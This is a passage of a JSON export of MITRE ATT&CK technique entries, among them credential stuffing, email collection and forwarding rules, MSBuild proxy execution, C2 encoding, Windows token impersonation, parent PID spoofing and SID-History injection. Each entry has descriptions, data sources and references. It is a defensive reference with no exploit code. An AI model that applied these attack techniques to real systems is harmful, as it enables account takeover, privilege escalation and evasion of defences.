        "description": "Metcalf, S. (2018, May 6). Trimarc Research: Detecting Password Spraying with Security Event Auditing. Retrieved January 16, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--b2d03cea-aec1-45ca-9744-9ee583c1e1cc",
    "platform": "linux|macos|windows|aws|gcp|azure|office-365|azure-ad|saas",
    "tid": "T1110.004",
    "technique": "Credential Stuffing",
    "tactic": "credential-access",
    "datasources": "authentication-logs|office-365-account-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.<!-- raw HTML omitted --><!-- raw HTML omitted -->Credential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization’s login failure policies.<!-- raw HTML omitted --><!-- raw HTML omitted -->Typically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:<!-- raw HTML omitted --><!-- raw HTML omitted -->* SSH (22/TCP)<!-- raw HTML omitted -->* Telnet (23/TCP)<!-- raw HTML omitted -->* FTP (21/TCP)<!-- raw HTML omitted -->* NetBIOS / SMB / Samba (139/TCP &amp; 445/TCP)<!-- raw HTML omitted -->* LDAP (389/TCP)<!-- raw HTML omitted -->* Kerberos (88/TCP)<!-- raw HTML omitted -->* RDP / Terminal Services (3389/TCP)<!-- raw HTML omitted -->* HTTP/HTTP Management Services (80/TCP &amp; 443/TCP)<!-- raw HTML omitted -->* MSSQL (1433/TCP)<!-- raw HTML omitted -->* Oracle (1521/TCP)<!-- raw HTML omitted -->* MySQL (3306/TCP)<!-- raw HTML omitted -->* VNC (5900/TCP)<!-- raw HTML omitted --><!-- raw HTML omitted -->In addition to management services, adversaries may “target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,” as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/600.html",
        "description": "none",
        "external_id": "CAPEC-600"
      },
      {
        "source_name": "US-CERT TA18-068A 2018",
        "url": "https://www.us-cert.gov/ncas/alerts/TA18-086A",
        "description": "US-CERT. (2018, March 27). TA18-068A Brute Force Attacks Conducted by Cyber Actors. Retrieved October 2, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--1e9eb839-294b-48cc-b0d3-c45555a2a004",
    "platform": "windows",
    "tid": "T1114.001",
    "technique": "Local Email Collection",
    "tactic": "collection",
    "datasources": "authentication-logs|file-monitoring|mail-server|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user’s local system, such as Outlook storage or cache files.<!-- raw HTML omitted --><!-- raw HTML omitted -->Outlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB.(Citation: Outlook File Sizes) IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in <code>C:\\Users\\&lt;username&gt;\\Documents\\Outlook Files</code> or <code>C:\\Users\\&lt;username&gt;\\AppData\\Local\\Microsoft\\Outlook</code>.(Citation: Microsoft Outlook Files)</p>\n",
    "technique_references": [
      {
        "source_name": "Outlook File Sizes",
        "url": "https://practical365.com/clients/office-365-proplus/outlook-cached-mode-ost-file-sizes/",
        "description": "N. O'Bryan. (2018, May 30). Managing Outlook Cached Mode and OST File Sizes. Retrieved February 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Outlook Files",
        "url": "https://support.office.com/en-us/article/introduction-to-outlook-data-files-pst-and-ost-222eaf92-a995-45d9-bde2-f331f60e2790",
        "description": "Microsoft. (n.d.). Introduction to Outlook Data Files (.pst and .ost). Retrieved February 19, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--b4694861-542c-48ea-9eb1-10d356e7140a",
    "platform": "office-365|windows",
    "tid": "T1114.002",
    "technique": "Remote Email Collection",
    "tactic": "collection",
    "datasources": "authentication-logs|email-gateway|mail-server|office-365-trace-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may target an Exchange server or Office 365 to collect sensitive information. Adversaries may leverage a user’s credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services or Office 365 to access email using credentials or access tokens. Tools such as <a href=\"https://attack.mitre.org/software/S0413\">MailSniper</a> can be used to automate searches for specific keywords.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--7d77a07d-02fe-4e88-8bd9-e9c008c01bf0",
    "platform": "office-365|windows",
    "tid": "T1114.003",
    "technique": "Email Forwarding Rule",
    "tactic": "collection",
    "datasources": "email-gateway|mail-server|office-365-trace-logs|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email-forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim’s organization to use as part of further exploits or operations.(Citation: US-CERT TA18-068A 2018) Outlook and Outlook Web App (OWA) allow users to create inbox rules for various email functions, including forwarding to a different recipient. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2) <!-- raw HTML omitted --><!-- raw HTML omitted -->Any user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more.</p>\n",
    "technique_references": [
      {
        "source_name": "US-CERT TA18-068A 2018",
        "url": "https://www.us-cert.gov/ncas/alerts/TA18-086A",
        "description": "US-CERT. (2018, March 27). TA18-068A Brute Force Attacks Conducted by Cyber Actors. Retrieved October 2, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Tim McMichael Exchange Mail Forwarding 2",
        "url": "https://blogs.technet.microsoft.com/timmcmic/2015/06/08/exchange-and-office-365-mail-forwarding-2/",
        "description": "McMichael, T.. (2015, June 8). Exchange and Office 365 Mail Forwarding. Retrieved October 8, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--c92e3d68-2349-49e4-a341-7edca2deff96",
    "platform": "windows",
    "tid": "T1127.001",
    "technique": "MSBuild",
    "tactic": "defense-evasion",
    "datasources": "process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.(Citation: MSDN MSBuild)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# code to be inserted into an XML project file.(Citation: MSDN MSBuild) MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.(Citation: LOLBAS Msbuild)</p>\n",
    "technique_references": [
      {
        "source_name": "MSDN MSBuild",
        "url": "https://msdn.microsoft.com/library/dd393574.aspx",
        "description": "Microsoft. (n.d.). MSBuild1. Retrieved November 30, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "LOLBAS Msbuild",
        "url": "https://lolbas-project.github.io/lolbas/Binaries/Msbuild/",
        "description": "LOLBAS. (n.d.). Msbuild.exe. Retrieved July 31, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--04fd5427-79c7-44ea-ae13-11b24778ff1c",
    "platform": "linux|macos|windows",
    "tid": "T1132.001",
    "technique": "Standard Encoding",
    "tactic": "command-and-control",
    "datasources": "network-protocol-analysis|packet-capture|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.</p>\n",
    "technique_references": [
      {
        "source_name": "Wikipedia Binary-to-text Encoding",
        "url": "https://en.wikipedia.org/wiki/Binary-to-text_encoding",
        "description": "Wikipedia. (2016, December 26). Binary-to-text encoding. Retrieved March 1, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Wikipedia Character Encoding",
        "url": "https://en.wikipedia.org/wiki/Character_encoding",
        "description": "Wikipedia. (2017, February 19). Character Encoding. Retrieved March 1, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--d467bc38-284b-4a00-96ac-125f447799fc",
    "platform": "linux|macos|windows",
    "tid": "T1132.002",
    "technique": "Non-Standard Encoding",
    "tactic": "command-and-control",
    "datasources": "network-protocol-analysis|packet-capture|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding)</p>\n",
    "technique_references": [
      {
        "source_name": "Wikipedia Binary-to-text Encoding",
        "url": "https://en.wikipedia.org/wiki/Binary-to-text_encoding",
        "description": "Wikipedia. (2016, December 26). Binary-to-text encoding. Retrieved March 1, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Wikipedia Character Encoding",
        "url": "https://en.wikipedia.org/wiki/Character_encoding",
        "description": "Wikipedia. (2017, February 19). Character Encoding. Retrieved March 1, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d",
    "platform": "windows",
    "tid": "T1134.001",
    "technique": "Token Impersonation/Theft",
    "tactic": "defense-evasion",
    "datasources": "access-tokens|api-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may duplicate then impersonate another user’s token to escalate privileges and bypass access controls. An adversary can create a new access token that duplicates an existing token using <!-- raw HTML omitted -->DuplicateToken(Ex)<!-- raw HTML omitted -->. The token can then be used with <!-- raw HTML omitted -->ImpersonateLoggedOnUser<!-- raw HTML omitted --> to allow the calling thread to impersonate a logged on user’s security context, or with <!-- raw HTML omitted -->SetThreadToken<!-- raw HTML omitted --> to assign the impersonated token to a thread.<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may do this when they have a specific, existing process they want to assign the new token to. For example, this may be useful for when the target user has a non-network logon session on the system.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft Command-line Logging",
        "url": "https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing",
        "description": "Mathers, B. (2017, March 7). Command line process auditing. Retrieved April 21, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d",
    "platform": "windows",
    "tid": "T1134.001",
    "technique": "Token Impersonation/Theft",
    "tactic": "privilege-escalation",
    "datasources": "access-tokens|api-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may duplicate then impersonate another user’s token to escalate privileges and bypass access controls. An adversary can create a new access token that duplicates an existing token using <!-- raw HTML omitted -->DuplicateToken(Ex)<!-- raw HTML omitted -->. The token can then be used with <!-- raw HTML omitted -->ImpersonateLoggedOnUser<!-- raw HTML omitted --> to allow the calling thread to impersonate a logged on user’s security context, or with <!-- raw HTML omitted -->SetThreadToken<!-- raw HTML omitted --> to assign the impersonated token to a thread.<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may do this when they have a specific, existing process they want to assign the new token to. For example, this may be useful for when the target user has a non-network logon session on the system.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft Command-line Logging",
        "url": "https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing",
        "description": "Mathers, B. (2017, March 7). Command line process auditing. Retrieved April 21, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--677569f9-a8b0-459e-ab24-7f18091fa7bf",
    "platform": "windows",
    "tid": "T1134.002",
    "technique": "Create Process with Token",
    "tactic": "defense-evasion",
    "datasources": "access-tokens|api-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may create a new process with a duplicated token to escalate privileges and bypass access controls. An adversary can duplicate a desired access token with <!-- raw HTML omitted -->DuplicateToken(Ex)<!-- raw HTML omitted --> and use it with <!-- raw HTML omitted -->CreateProcessWithTokenW<!-- raw HTML omitted --> to create a new process running under the security context of the impersonated user. This is useful for creating a new process under the security context of a different user.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft Command-line Logging",
        "url": "https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing",
        "description": "Mathers, B. (2017, March 7). Command line process auditing. Retrieved April 21, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--677569f9-a8b0-459e-ab24-7f18091fa7bf",
    "platform": "windows",
    "tid": "T1134.002",
    "technique": "Create Process with Token",
    "tactic": "privilege-escalation",
    "datasources": "access-tokens|api-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may create a new process with a duplicated token to escalate privileges and bypass access controls. An adversary can duplicate a desired access token with <!-- raw HTML omitted -->DuplicateToken(Ex)<!-- raw HTML omitted --> and use it with <!-- raw HTML omitted -->CreateProcessWithTokenW<!-- raw HTML omitted --> to create a new process running under the security context of the impersonated user. This is useful for creating a new process under the security context of a different user.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft Command-line Logging",
        "url": "https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing",
        "description": "Mathers, B. (2017, March 7). Command line process auditing. Retrieved April 21, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--8cdeb020-e31e-4f88-a582-f53dcfbda819",
    "platform": "windows",
    "tid": "T1134.003",
    "technique": "Make and Impersonate Token",
    "tactic": "defense-evasion",
    "datasources": "access-tokens|api-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may make and impersonate tokens to escalate privileges and bypass access controls. If an adversary has a username and password but the user is not logged onto the system, the adversary can then create a logon session for the user using the <!-- raw HTML omitted -->LogonUser<!-- raw HTML omitted --> function. The function will return a copy of the new session’s access token and the adversary can use <!-- raw HTML omitted -->SetThreadToken<!-- raw HTML omitted --> to assign the token to a thread.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft Command-line Logging",
        "url": "https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing",
        "description": "Mathers, B. (2017, March 7). Command line process auditing. Retrieved April 21, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--8cdeb020-e31e-4f88-a582-f53dcfbda819",
    "platform": "windows",
    "tid": "T1134.003",
    "technique": "Make and Impersonate Token",
    "tactic": "privilege-escalation",
    "datasources": "access-tokens|api-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may make and impersonate tokens to escalate privileges and bypass access controls. If an adversary has a username and password but the user is not logged onto the system, the adversary can then create a logon session for the user using the <!-- raw HTML omitted -->LogonUser<!-- raw HTML omitted --> function. The function will return a copy of the new session’s access token and the adversary can use <!-- raw HTML omitted -->SetThreadToken<!-- raw HTML omitted --> to assign the token to a thread.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft Command-line Logging",
        "url": "https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing",
        "description": "Mathers, B. (2017, March 7). Command line process auditing. Retrieved April 21, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--93591901-3172-4e94-abf8-6034ab26f44a",
    "platform": "windows",
    "tid": "T1134.004",
    "technique": "Parent PID Spoofing",
    "tactic": "defense-evasion",
    "datasources": "api-monitoring|process-monitoring|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <!-- raw HTML omitted -->CreateProcess<!-- raw HTML omitted --> API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <!-- raw HTML omitted -->svchost.exe<!-- raw HTML omitted --> or <!-- raw HTML omitted -->consent.exe<!-- raw HTML omitted -->) rather than the current user context.(Citation: Microsoft UAC Nov 2018)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of <a href=\"https://attack.mitre.org/techniques/T1086\">PowerShell</a>/<a href=\"https://attack.mitre.org/techniques/T1085\">Rundll32</a> to be <!-- raw HTML omitted -->explorer.exe<!-- raw HTML omitted --> rather than an Office document delivered as part of <a href=\"https://attack.mitre.org/techniques/T1566/001\">Spearphishing Attachment</a>.(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via <a href=\"https://attack.mitre.org/techniques/T1059/005\">Visual Basic</a> within a malicious Office document or any code that can perform <a href=\"https://attack.mitre.org/techniques/T1106\">Native API</a>.(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)<!-- raw HTML omitted --><!-- raw HTML omitted -->Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <!-- raw HTML omitted -->lsass.exe<!-- raw HTML omitted -->), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)</p>\n",
    "technique_references": [
      {
        "source_name": "DidierStevens SelectMyParent Nov 2009",
        "url": "https://blog.didierstevens.com/2009/11/22/quickpost-selectmyparent-or-playing-with-the-windows-process-tree/",
        "description": "Stevens, D. (2009, November 22). Quickpost: SelectMyParent or Playing With the Windows Process Tree. Retrieved June 3, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft UAC Nov 2018",
        "url": "https://docs.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works",
        "description": "Montemayor, D. et al.. (2018, November 15). How User Account Control works. Retrieved June 3, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "CounterCept PPID Spoofing Dec 2018",
        "url": "https://www.countercept.com/blog/detecting-parent-pid-spoofing/",
        "description": "Loh, I. (2018, December 21). Detecting Parent PID Spoofing. Retrieved June 3, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "CTD PPID Spoofing Macro Mar 2019",
        "url": "https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/",
        "description": "Tafani-Dereeper, C. (2019, March 12). Building an Office macro to spoof parent processes and command line arguments. Retrieved June 3, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "XPNSec PPID Nov 2017",
        "url": "https://blog.xpnsec.com/becoming-system/",
        "description": "Chester, A. (2017, November 20). Alternative methods of becoming SYSTEM. Retrieved June 4, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Process Creation Flags May 2018",
        "url": "https://docs.microsoft.com/windows/desktop/ProcThread/process-creation-flags",
        "description": "Schofield, M. & Satran, M. (2018, May 30). Process Creation Flags. Retrieved June 4, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Secuirtyinbits Ataware3 May 2019",
        "url": "https://www.securityinbits.com/malware-analysis/parent-pid-spoofing-stage-2-ataware-ransomware-part-3",
        "description": "Secuirtyinbits . (2019, May 14). Parent PID Spoofing (Stage 2) Ataware Ransomware Part 3. Retrieved June 6, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--93591901-3172-4e94-abf8-6034ab26f44a",
    "platform": "windows",
    "tid": "T1134.004",
    "technique": "Parent PID Spoofing",
    "tactic": "privilege-escalation",
    "datasources": "api-monitoring|process-monitoring|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <!-- raw HTML omitted -->CreateProcess<!-- raw HTML omitted --> API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <!-- raw HTML omitted -->svchost.exe<!-- raw HTML omitted --> or <!-- raw HTML omitted -->consent.exe<!-- raw HTML omitted -->) rather than the current user context.(Citation: Microsoft UAC Nov 2018)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of <a href=\"https://attack.mitre.org/techniques/T1086\">PowerShell</a>/<a href=\"https://attack.mitre.org/techniques/T1085\">Rundll32</a> to be <!-- raw HTML omitted -->explorer.exe<!-- raw HTML omitted --> rather than an Office document delivered as part of <a href=\"https://attack.mitre.org/techniques/T1566/001\">Spearphishing Attachment</a>.(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via <a href=\"https://attack.mitre.org/techniques/T1059/005\">Visual Basic</a> within a malicious Office document or any code that can perform <a href=\"https://attack.mitre.org/techniques/T1106\">Native API</a>.(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)<!-- raw HTML omitted --><!-- raw HTML omitted -->Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <!-- raw HTML omitted -->lsass.exe<!-- raw HTML omitted -->), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)</p>\n",
    "technique_references": [
      {
        "source_name": "DidierStevens SelectMyParent Nov 2009",
        "url": "https://blog.didierstevens.com/2009/11/22/quickpost-selectmyparent-or-playing-with-the-windows-process-tree/",
        "description": "Stevens, D. (2009, November 22). Quickpost: SelectMyParent or Playing With the Windows Process Tree. Retrieved June 3, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft UAC Nov 2018",
        "url": "https://docs.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works",
        "description": "Montemayor, D. et al.. (2018, November 15). How User Account Control works. Retrieved June 3, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "CounterCept PPID Spoofing Dec 2018",
        "url": "https://www.countercept.com/blog/detecting-parent-pid-spoofing/",
        "description": "Loh, I. (2018, December 21). Detecting Parent PID Spoofing. Retrieved June 3, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "CTD PPID Spoofing Macro Mar 2019",
        "url": "https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/",
        "description": "Tafani-Dereeper, C. (2019, March 12). Building an Office macro to spoof parent processes and command line arguments. Retrieved June 3, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "XPNSec PPID Nov 2017",
        "url": "https://blog.xpnsec.com/becoming-system/",
        "description": "Chester, A. (2017, November 20). Alternative methods of becoming SYSTEM. Retrieved June 4, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Process Creation Flags May 2018",
        "url": "https://docs.microsoft.com/windows/desktop/ProcThread/process-creation-flags",
        "description": "Schofield, M. & Satran, M. (2018, May 30). Process Creation Flags. Retrieved June 4, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Secuirtyinbits Ataware3 May 2019",
        "url": "https://www.securityinbits.com/malware-analysis/parent-pid-spoofing-stage-2-ataware-ransomware-part-3",
        "description": "Secuirtyinbits . (2019, May 14). Parent PID Spoofing (Stage 2) Ataware Ransomware Part 3. Retrieved June 6, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--b7dc639b-24cd-482d-a7f1-8897eda21023",
    "platform": "windows",
    "tid": "T1134.005",
    "technique": "SID-History Injection",
    "tactic": "defense-evasion",
    "datasources": "api-monitoring|authentication-logs|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).<!-- raw HTML omitted --><!-- raw HTML omitted -->With Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as <a href=\"https://attack.mitre.org/techniques/T1021\">Remote Services</a>, <a href=\"https://attack.mitre.org/techniques/T1077\">Windows Admin Shares</a>, or <a 